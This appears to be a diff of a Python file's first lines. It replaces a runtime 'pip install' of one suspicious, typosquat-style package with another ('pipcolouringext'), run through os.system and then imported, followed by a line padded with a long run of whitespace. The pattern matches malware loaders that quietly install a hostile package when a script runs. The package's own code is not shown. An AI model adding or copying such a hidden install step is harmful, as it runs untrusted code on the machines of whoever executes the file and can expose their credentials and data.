@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipcoloringsliberyV1")
-import pipcoloringsliberyV1
+os.system("pip install pipcolouringext")
+import pipcolouringext
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
